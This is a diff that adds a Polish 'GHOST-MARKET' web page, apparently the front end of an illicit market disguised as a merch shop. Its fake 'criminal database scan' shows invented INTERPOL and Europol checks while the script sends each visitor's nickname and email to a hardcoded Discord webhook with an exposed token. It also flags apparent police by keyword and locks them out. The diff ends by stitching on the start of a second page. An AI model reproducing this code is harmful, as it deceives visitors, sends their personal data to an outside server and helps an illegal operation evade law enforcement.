@@ -3,6 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOST-MARKET v.9004 // GLOBAL SCAN</title>
+    <style>
+        :root { --red: #ff0000; --green: #00ff41; --bg: #000; --white: #fff; --gray: #1a1a1a; }
+        body { background: var(--bg); color: var(--white); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        header { border-bottom: 1px solid var(--gray); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: #050505; }
+        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        .card { border: 1px solid var(--gray); background: #0a0a0a; padding: 20px; text-align: center; border-top: 3px solid var(--white); }
+        .btn { border: 1px solid #444; color: #fff; padding: 12px; background: none; cursor: pointer; width: 100%; font-weight: bold; text-transform: uppercase; }
+        .btn:hover { border-color: var(--red); color: var(--red); }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; align-items: center; justify-content: center; z-index: 1000; }
+        .modal { background: #050505; border: 1px solid var(--red); padding: 30px; width: 450px; text-align: center; }
+        .input-gh { width: 100%; padding: 14px; margin: 10px 0; background: #111; border: 1px solid var(--gray); color: #fff; box-sizing: border-box; }
+        #log-screen { background: #000; color: var(--green); padding: 10px; font-size: 11px; text-align: left; height: 150px; overflow-y: auto; border: 1px solid #222; margin-top: 10px; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div style="letter-spacing: 2px;">GHOST-MARKET <span style="color: var(--red);">v.9004</span></div>
+    <div style="color: var(--green); font-size: 10px;">[ SCANNER: ONLINE ]</div>
+    <button class="btn" style="width: auto; padding: 5px 15px;" onclick="openAuth()">[ WEJŚCIE ]</button>
+</header>
+
+<div class="container" id="main-view">
+    <div class="grid">
+        <div class="card">
+            <div style="height:250px; background: #050505; margin-bottom:15px; border:1px solid #111; display:flex; align-items:center; justify-content:center; color:#333;">[ IMAGE_PROTECTED ]</div>
+            <h3>MERCH // PRZYKRYWKA</h3>
+            <div style="color:var(--green); font-size:24px; margin:10px 0;">89,00 PLN</div>
+            <button class="btn" onclick="openAuth()">ZALOGUJ</button>
+        </div>
+    </div>
+</div>
+
+<div id="modal-auth" class="overlay">
+    <div class="modal">
+        <h3>GLOBAL CRIMINAL DATABASE SCAN</h3>
+        <p style="font-size: 10px; color: #666;">WERYFIKACJA IP / MAIL / BAZY POSZUKIWANYCH (INTERPOL, EUROPOL, IPA)</p>
+        
+        <div id="input-area">
+            <input type="text" id="u-name" class="input-gh" placeholder="DOKS ID / NICK">
+            <input type="email" id="u-mail" class="input-gh" placeholder="ADRES E-MAIL">
+            <button class="btn" style="background: var(--red); color: #000; border: none;" onclick="runDeepScan()">URUCHOM SKANOWANIE</button>
+        </div>
+
+        <div id="scan-area" class="hidden">
+            <div id="log-screen"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const discord_webhook = "https://discord.com/api/webhooks/1483238307268661380/L-q3uhMziz1753tB9GBSHSd_SYDJn0Poule_Dq-3vom05h3PDN0_jzBSNBehY7dR9EQe";
+
+    function openAuth() { document.getElementById('modal-auth').style.display = 'flex'; }
+    
+    function addLog(msg, color = "#00ff41") {
+        const screen = document.getElementById('log-screen');
+        const line = document.createElement('div');
+        line.style.color = color;
+        line.innerText = `> ${msg}`;
+        screen.appendChild(line);
+        screen.scrollTop = screen.scrollHeight;
+    }
+
+    async function runDeepScan() {
+        const name = document.getElementById('u-name').value;
+        const mail = document.getElementById('u-mail').value;
+        if(!name || !mail) return alert("Brak danych!");
+
+        document.getElementById('input-area').classList.add('hidden');
+        document.getElementById('scan-area').classList.remove('hidden');
+
+        addLog("Pobieranie metadanych sesji...");
+        addLog("IP: 194.242.110.XX (Masked)");
+        await new Promise(r => setTimeout(r, 1000));
+        
+        addLog("Łączenie z bazami INTERPOL API...");
+        await new Promise(r => setTimeout(r, 1500));
+        
+        addLog("Sprawdzanie rejestrów poszukiwanych Europol...");
+        
+        // Kryteria BANA (możesz tu wpisać maile/naki osób które chcesz zbanować)
+        const blacklist = ["policja", "psiarnia", "112", "interpol", "fbi"];
+        const isWanted = blacklist.some(term => name.toLowerCase().includes(term) || mail.toLowerCase().includes(term));
+
+        if(isWanted) {
+            addLog("!!! MATCH FOUND !!!", "red");
+            addLog("STATUS: WANTED / POLICE IDENTIFIED", "red");
+            addLog("INITIATING TOTAL BAN PROTOCOL...", "red");
+            
+            setTimeout(() => executeBan(name, mail, "WANTED_PERSON"), 2000);
+        } else {
+            addLog("Status: CLEAR.");
+            addLog("Weryfikacja IPA zakończona pomyślnie.");
+            addLog("Generowanie klucza sesji...");
+            
+            setTimeout(() => {
+                fetch(discord_webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, 
+                    body: JSON.stringify({ content: `✅ **CLEAR**: ${name} (${mail}) przeszedł skanowanie baz.` }) 
+                });
+                alert("Weryfikacja zakończona. Witamy w Ghost-Market.");
+                location.reload(); // Tutaj możesz przekierować do panelu
+            }, 2000);
+        }
+    }
+
+    function executeBan(name, mail, reason) {
+        localStorage.setItem('GHOST_BAN_PERMANENT', 'true');
+        fetch(discord_webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ 
+                content: `🚨 **WANTED ALERT** 🚨\nNazwa: ${name}\nMail: ${mail}\nPowód: ${reason}\nAkcja: Zablokowano dostęp.` 
+            }) 
+        });
+        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-family:monospace;'>ACCESS DENIED.<br>WANTED STATUS DETECTED.<br>IP RECORDED.</h1>";
+    }
+
+    // Blokada startowa
+    if(localStorage.getItem('GHOST_BAN_PERMANENT')) {
+        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-family:monospace;'>SYSTEM PERMANENTLY LOCKED.</h1>";
+    }
+</script>
+</body>
+</html><!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GHOST-MARKET v.9002 // AUTO-REPAIR</title>
     <style>
         :root { --red: #ff0000; --green: #00ff41; --bg: #000; --white: #fff; --gray: #1a1a1a; }
